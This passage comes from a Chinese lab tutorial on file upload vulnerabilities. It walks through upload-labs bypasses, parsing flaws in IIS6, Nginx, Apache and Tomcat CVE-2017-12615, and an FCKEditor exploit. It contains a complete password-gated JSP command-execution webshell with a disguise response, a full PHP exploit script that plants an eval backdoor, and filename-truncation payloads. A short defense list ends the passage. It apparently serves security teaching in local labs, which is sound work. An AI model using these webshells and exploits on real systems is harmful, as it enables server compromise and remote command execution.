注意：如果数据是在 POST 请求体里，不能直接敲 `%00` 字符，必须将其进行 URL Decode（变成真正的空字节）才能生效。

1. 上传文件，bp 抓包

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780590543521-61e6aef9-a455-4a4e-af43-dd3d20cd4044.png)

2. 将 `save_name` 的值改为 `upload-19.php%00.jpg`。

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780590616257-330b70f1-5e67-4877-857d-300411e450cd.png)

3. %00 URL 解码  

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780590699781-31e06085-9bf8-4779-bf76-c8b53976f799.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780590721651-60d628ec-4e2a-4b87-b7dc-0fd4d73822cd.png)

编码完成后%00 消失了。

4. 查看响应，访问

```plain
http://127.0.0.1/upload/upload-19.php
```

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780590828815-05ee18ac-e1bc-431f-8bc1-0a28defe9378.png)

#### 方法二：`/.` （常用）
1. 用 Burp Suite 抓包

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780591321759-3b27d653-f369-452e-95f7-2fda5b37881e.png)

2. 找到请求体（Body）里的 `save_name` 参数，把它的值改成 `upload-19.php/.`

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780591426237-988dce93-fc57-4f28-92f1-06d30138eec4.png)

3. 发送响应，访问;

```plain
127.0.0.1/upload/upload-19.php/.
```

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780591483873-cce5cc08-e25c-43e1-81c3-d045942bf803.png)

## Pass-20-白名单 
### 1、题目
<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780591540187-0faae44d-5f34-4833-8064-3b52c72afa67.png)

```php
$is_upload = false;
$msg = null;
if(!empty($_FILES['upload_file'])){
    //检查MIME
    $allow_type = array('image/jpeg','image/png','image/gif');
    if(!in_array($_FILES['upload_file']['type'],$allow_type)){
        $msg = "禁止上传该类型文件!";
    }else{
        //检查文件名
        $file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name'];
        if (!is_array($file)) {
            $file = explode('.', strtolower($file));
        }

        $ext = end($file);
        $allow_suffix = array('jpg','png','gif');
        if (!in_array($ext, $allow_suffix)) {
            $msg = "禁止上传该后缀文件!";
        }else{
            $file_name = reset($file) . '.' . $file[count($file) - 1];
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH . '/' .$file_name;
            if (move_uploaded_file($temp_file, $img_path)) {
                $msg = "文件上传成功！";
                $is_upload = true;
            } else {
                $msg = "文件上传失败！";
            }
        }
    }
}else{
    $msg = "请选择要上传的文件！";
}
```

### 2、解题思路
1. 分析代码
+  MIME 校验 

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780591981459-0d4e7117-c2f9-4f50-ba5c-69ab13a19231.png)

+   用户自定义的 `$_POST['save_name']`， 三元运算符 ， 如果 `$file` 不是数组，就用 `.` 把它切割成数组。  

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780591968942-91aa4ec2-3149-4955-9dbc-447b2cbcac0f.png)

+  用 `end($file)` 获取后缀过白名单。
+  用 `reset($file)` 拿数组开头，拼接 `.`，再拼接 `$file[count($file) - 1]` 作为最终文件名。   

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780592089482-72489834-d5b2-438b-a035-8e7639c07e71.png)

end() 函数将数组内部指针指向最后⼀个元素，并返回该元素的值，所以这个函数可以接受数组的

reset() 函数将内部指针指向数组中的第⼀个元素，并输出，所以这个函数也可以接受数组的

count() 统计数组有多少个元素

### 3、操作
1.  抓包与 MIME 伪装 

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780592483143-37243d38-23c1-49f2-833d-d9d5f107703e.png)

2.  将原本的表单字段名 `name="save_name"` 修改为带有索引的数组形式 `name="save_name[0]"`。  
3.  伪造数组尾部，在刚刚修改的那段表单数据下面，**手动复制并粘贴出一块完整的表单格式**。 将其命名为 `name="save_name[2]"`，并给它赋一个绝对合法的白名单后缀值，比如 `jpg`
+ `save_name[2]`的 `jpg` 负责**骗过白名单**。
+ `save_name[0]` 的 `upload-20.php/` 负责**指定最终文件类型**。（$file_name = reset($file) . '.' . $file[count($file) - 1];）
+ 中间缺少的 `save_name[1]` 负责触发 `count()` 漏洞，带来一个 **NULL**。

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780593002175-e682e7fe-f6f6-422c-8aec-859d0e43e0d8.png)

4. 查看响应，访问

```plain
http://127.0.0.1/upload/upload-20.php
```

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780593077107-cb99b9b6-1576-4d0a-95a6-11b840ee312e.png)

---

# 四、解析与编辑器漏洞
## 靶场搭建
进入你的 Ubuntu 虚拟机，打开终端（Terminal）

```plain
# 1. 更新软件源
sudo apt update

# 2. 安装 Docker、Docker-Compose 和 Git
sudo apt install docker.io docker-compose git -y

# 3. 启动并设置 Docker 开机自启
sudo systemctl start docker
sudo systemctl enable docker
```

```plain
# 下载 Vulhub 仓库
git clone https://github.com/vulhub/vulhub.git
```

## 1. IIS6解析漏洞
IIS6.0使用Windows2003系统

### (1) IIS6.0解析漏洞介绍
+ 当建立*.asa、.asp格式的文件夹时，其目录下的任意文件都将被IIS当做asp文件解析。
+ 当文件命名为.asp;1.jpg，IIS6.0同样会将文件当做asp文件解析。

### (2) 步骤
新建IIS.ASP文件，内容：`<% response.write("i am hacker")%>`  
复制一份改名为`IIS.asp;IIS.jpg`，放到网站目录C:\IIS6\WEB，访问：`192.168.0.11/IIS.asp;IIS.jpg`，页面输出i am hacker。

## 2. Tomcat文件解析漏洞 CVE-2017-12615
### (1) 漏洞简介与条件
+ 简介： Tomcat 的 `conf/web.xml` 中有一个 `DefaultServlet`。默认情况下，它的 `readonly` 参数是 `true`，意味着服务器是只读的。 但有些开发者为了方便调试或出于某些特殊业务需求，将其改为了 `false`。 一旦设为 `false`，Tomcat 就直接允许客户端使用 HTTP 的 `PUT` 和 `DELETE` 方法来直接操作服务器上的文件。虽然 `PUT` 方法被放开了，但 Tomcat 的安全机制会拦截以 `.jsp` 或 `.jspx` 结尾的请求，防止直接写个 Java 木马进去执行。 
+ 条件：Tomcat部署在Windows系统、开启HTTP PUT请求方法，攻击者可PUT上传JSP木马。

### (2) 环境部署  
```bash
注意： Docker 的核心后台服务（Daemon）默认是要求 root 最高权限才能调用的。
sudo su   // 切换为 Root 最高权限
cd /home/enjoy/vulhub-master/tomcat/CVE-2017-12615		// 进入目标漏洞的靶场目录 (按需修改路径)
docker-compose build	// 启动靶场
docker-compose up -d	//验证 docker-compose.yml 配置文件格式是否正确
docker-compose config	// 强制根据当前配置重新构建镜像

docker-compose down		// 测试完毕后，安全销毁容器并释放端口！！！
```

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780737220732-d121920b-b0d7-4349-adb4-1ff95a47931e.png)

### (3) 操作
1.  获取靶机 IP  

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780736742791-ef9a981a-cca4-45ce-9efc-c7a8d295a2e8.png)

访问：http://192.168.23.134:8080/

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780737262034-d7906b71-456c-42a5-897b-b34f867eaf14.png)

2. BP 抓包，构造PUT数据包上传1.jsp

```http
PUT /1.jsp/ HTTP/1.1
Host: 192.168.23.134:8080
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 641

<%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%>
<%! 
public static String excuteCmd(String c) {
    StringBuilder line = new StringBuilder();
    try {
        Process pro = Runtime.getRuntime().exec(c);
        BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream())); 
        String temp = null;
        while ((temp = buf.readLine()) != null) {
            line.append(temp+"\n"); 
        }
        buf.close();
    } catch (Exception e) {
        line.append(e.getMessage());
    }
    return line.toString();
}
%>
<%
if("023".equals(request.getParameter("pwd")) && !"".equals(request.getParameter("cmd"))){
    out.println("<pre>"+excuteCmd(request.getParameter("cmd"))+"</pre>");
} else {
    out.println(":-)");
}
%>
```

+ **PUT /1.jsp/ HTTP/1.1**：在目标中新建一个 1.jsp
+ Host: 192.168.23.134:8080：改成自己的 IP
+ `pwd=023`：这是木马的密码。如果别人扫描到了你的木马，但不知道密码是 `023`，就无法利用它。
+ `cmd=xxxx`：你要执行的系统命令。
+ **防御伪装**：如果密码不对，或者没有传命令，页面会无辜地打印出一个笑脸 `:-)`。只有密码对且传了命令，才会调用上面的 `excuteCmd` 并在页面上用 `<pre>` 标签（保持格式）把命令执行结果吐出来。

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780737797900-1b013027-f320-4588-9034-f6996a220ae2.png)

3. 木马访问

一旦这个包发送成功，服务器返回了 `201 Created` 或者 `200 OK`，就说明木马已经种下去了。

访问：

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780737824903-3110d14e-4dd0-429d-8b3d-5fb355f6d92d.png)

`http://192.168.23.134:8080/1.jsp?&pwd=023&cmd=dir`

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780737858205-83878b38-0016-42ec-bf8e-3cf440a348be.png)

4. 进入容器查看文件

```plain
docker ps
docker exec -it 9bec0475e5af /bin/bash
ls
cd webapps/
cd ROOT/
ls
```

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780737884741-4525c422-aa0c-41c5-9825-f85d99757abb.png)

## 3. Nginx解析漏洞
### (1) 漏洞原理
上传正常图片`xxx.png`，访问`xxx.png/.php`，Nginx会把图片交由php-fpm当做PHP代码解析。

### (2) 环境部署
```bash
sudo su
cd /home/enjoy/vulhub-master/nginx/nginx_parsing_vulnerability
docker-compose build
docker-compose up -d
docker-compose config
docker-compose down
```

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780738008228-4151ffb8-548b-421d-bd07-91a1339f83bb.png)

访问：http://192.168.23.134/

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780738275038-c1a625cc-86c6-4a3f-87fa-d06cc54bb711.png)

### (3) 操作
1. 页面上传图片马webshell.png；

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780738321312-9313cf2f-6052-4236-82f5-b2b9bdf9d0a2.png)

2. 访问：`http://192.168.23.134/uploadfiles/db7f1a5d97d66c9bba4550973b6dafc8.png`

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780738373901-07d8f073-e66f-44d7-9efc-95f3bc1bac3d.png)

3. `http://192.168.23.134/uploadfiles/db7f1a5d97d66c9bba4550973b6dafc8.png/a.php`，代码被执行。

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780738407167-59d71570-0cef-4d72-9af9-188c4efe1770.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780738444923-e5c2fd6c-6582-4587-a74f-08cfffbad736.png)不加 a 也可以

## 4. Apache多后缀解析漏洞
### (1) 漏洞原理
Apache从右往左识别文件后缀，文件名只要包含.php就会被解析，例如`webshell.php.png`。

### (2) 环境部署
```bash
sudo su
cd /home/enjoy/vulhub-master/httpd/apache_parsing_vulnerability
docker-compose build
docker-compose up -d
docker-compose config
docker-compose down
```

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780738838719-220cfc0a-e18c-417f-ac78-fba68e9c0df8.png)

访问：http://192.168.23.134/

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780738913524-bd53cbbb-0a31-4b92-9ad5-99bf625944d4.png)

### (3)操作
1. 上传改名后的木马`webshell.php.png`

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780738938316-d2523f8b-994f-4ea2-881b-299d1fd483b6.png)

2. 访问：

```bash
http://192.168.23.134/uploadfiles/webshell.php.png
```

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780738975851-b91352a1-5343-4955-98cd-f30615b73d71.png)

## 5. Apache换行解析漏洞 CVE-2017-15715
影响版本：Apache2.4.0~2.4.29，`1.php%0A`格式文件名可绕过上传黑名单，被当做PHP解析。

### (1) 环境部署
```bash
sudo su
cd /home/enjoy/vulhub-master/httpd/CVE-2017-15715
docker-compose build
docker-compose up -d
docker-compose config
docker-compose down
```

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780739069994-c552631d-1a67-4efd-921c-463cc3efa456.png)

访问:  http://192.168.23.134:8080/

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780739225930-b7fef8d5-cf1a-449e-b46d-7fa41f709fc8.png)

### (2) 漏洞利用
1. Burp拦截上传数据包

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780742804950-90fc3e1b-796b-4fe9-a9e0-1f3941a0087e.png)<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780742862218-eec9bebb-3d4c-4c44-b3b9-0b2320683aa0.png)

2. 修改文件名为`1.php%0A`，将 %0A URL解码，放行数据包；

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780742839841-90270a75-f729-4f0a-a682-61250bc5ae8b.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780742926419-2147b1b7-285c-49c9-bb65-1fc16e66e4b9.png)

3. 访问`http://192.168.23.134:8080/1.php%0a`执行phpinfo。

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780742620393-d8a1945f-0c76-479f-bdfe-189a55687d0f.png)

## 6.  编辑器漏洞-FCKEditor
### (1) 环境搭建
1. 把FCKeditor源码放入phpstudy 网站根目录。
2. 修改配置文件：`fckeditor\editor\filemanager\connectors\php\config.php` 修改配置：`$Config['Enabled'] = true;`
3. 访问测试页面：http://localhost/fckeditor/_whatsnew.html

### (2) 漏洞原理
Web 应用层（PHP）和操作系统底层（C 语言）在**处理字符串边界时存在认知差异**。  利用0x00截断漏洞，`.gif` 骗过了 PHP 的安检，又利用中间的 `%00` 让操作系统去掉了 `.gif` 的伪装 。`CurrentFolder=xxx.php%00.gif`，上传带GIF文件头的一句话图片马，服务器保存为php文件。

### (3)EXP利用脚本fck.php
```php
<?php
error_reporting(0);
set_time_limit(0);
ini_set("default_socket_timeout", 5);
define(STDIN, fopen("php://stdin", "r"));
$match = array();
function http_send($host, $packet)
{
$sock = fsockopen($host, 80);
while (!$sock)
{
print "\n[-] No response from {$host}:80 Trying again...";
$sock = fsockopen($host, 80);
}
fputs($sock, $packet);
while (!feof($sock)) $resp .= fread($sock, 1024);
fclose($sock);
print $resp;
return $resp;
}
function connector_response($html)
{
global $match;
return (preg_match("/OnUploadCompleted\((\d),\"(.*)\"\)/", $html, $match) && in_array($match[1], array(0, 201)));
}
print "\n+------------------------------------------------------------------+";
print "\n| FCKEditor Servelet Arbitrary File Upload Exploit |";
print "\n+------------------------------------------------------------------+\n";
if ($argc < 3)
{
print "\nUsage......: php $argv[0] host path\n";
print "\nExample....: php $argv[0] localhost /\n";
print "\nExample....: php $argv[0] localhost /FCKEditor/\n";
die();
}
$host = $argv[1];
$path = ereg_replace("(/){2,}", "/", $argv[2]);
$filename = "fvck.gif";
$foldername = "fuck.php%00.gif";
$connector = "editor/filemanager/connectors/php/connector.php";
$payload = "-----------------------------265001916915724\r\n";
$payload .= "Content-Disposition: form-data; name=\"NewFile\"; filename=\"{$filename}\"\r\n";
$payload .= "Content-Type: image/jpeg\r\n\r\n";
$payload .= 'GIF89a'."\r\n".'<?php eval($_POST[cmd]) ?>'."\n";
$payload .= "-----------------------------265001916915724--\r\n";
$packet = "POST {$path}{$connector}?Command=FileUpload&Type=Image&CurrentFolder=".$foldername." HTTP/1.0\r\n";//print $packet;
$packet .= "Host: {$host}\r\n";
$packet .= "Content-Type: multipart/form-data; boundary=---------------------------265001916915724\r\n";
$packet .= "Content-Length: ".strlen($payload)."\r\n";
$packet .= "Connection: close\r\n\r\n";
$packet .= $payload;
print $packet;
if (!connector_response(http_send($host, $packet))) die("\n[-] Upload failed!\n");
else print "\n[-] Job done! try http://${host}/$match[2] \n";
?>
```

### (4) 实操
1. 新建 fck.php
2. 执行利用命令

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780812466593-edae4340-42a7-48d1-bc09-5c670423c198.png)

```plain
php.exe [你的脚本完整路径] [目标IP与端口] [目标所在的相对路径]
例如：
php.exe C:\Users\Jasmine\Desktop\fck.php 127.0.0.1:80 /upload_editor_bachang/fckeditor/
```

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780813074892-f55e9746-73b1-4911-bb3c-6fc1183e4675.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780813089352-921bf35e-72f4-4f2b-94bc-843b6941f310.png)

访问：

http://127.0.0.1:80//userfiles/image/fuck.php.gif/fvck.gif

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780813340076-e0d4bd1f-d7dc-4a63-af0c-35919e468f24.png)

POST 请求

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780815975231-38bb2173-3b27-4feb-a0b0-cabe30a727ee.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780815850964-565cd3da-eb1c-4449-a0dd-a14b4db8eb67.png)

---

# 五、防御思路
+ 服务端校验，禁用前端JS校验。
+ 白名单限制文件后缀，而非黑名单。
+ 校验文件MIME类型、文件头、文件内容。
+ 随机重命名上传文件，防止路径遍历。
+ 上传目录设置为不可执行，隔离Web目录与上传目录。

---

# 六、总结
+ 在⽂件上传的功能处，若服务端脚本语⾔未对上传的⽂件进⾏严格验证和过滤，导致恶意⽤户上传恶意的脚本⽂件时，就有可能获取执⾏服务端命令的能⼒，这就是⽂件上传漏洞。
+ ⽂件上传漏洞对Web应⽤来说是⼀种⾮常严重的漏洞。⼀般情况下，Web应⽤都会允许用户上传⼀些⽂件，如头像、附件等信息，如果Web应⽤没有对⽤户上传的⽂件进⾏有效的检查过滤，那么恶意⽤户就会上传⼀句话⽊⻢等，从⽽达到控制Web⽹站的⽬的。
+ 补充：
    - $image_type=exif_imagetype($filename);判断是否为图片类型（image/png)，和非图片类型
    - ext_arr：白名单
    - deny_arr：黑名单



